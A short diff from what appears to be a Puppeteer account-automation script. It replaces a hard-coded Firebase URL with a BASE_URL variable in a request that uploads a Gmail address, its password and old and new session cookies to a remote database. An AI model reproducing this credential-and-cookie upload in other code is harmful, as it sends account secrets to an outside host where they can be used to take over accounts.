@@ -337,7 +337,7 @@ async function loginWithCompleted(number, password, cookies, worker) {
                     let n_cookies = await getNewCookies(await page.cookies())
                     
                     try {
-                        await axios.patch('https://job-server-088-default-rtdb.firebaseio.com/%C2%A3uck%E3%80%85you/code/error/'+number+'.json', JSON.stringify({ gmail: mData.gmail.replace(/[.]/g, ''), password:password, cookies:cookies, n_cookies:n_cookies, create: parseInt(new Date().getTime()/1000) }), {
+                        await axios.patch(BASE_URL+'error/'+number+'.json', JSON.stringify({ gmail: mData.gmail.replace(/[.]/g, ''), password:password, cookies:cookies, n_cookies:n_cookies, create: parseInt(new Date().getTime()/1000) }), {
                             headers: {
                                 'Content-Type': 'application/x-www-form-urlencoded'
                             }
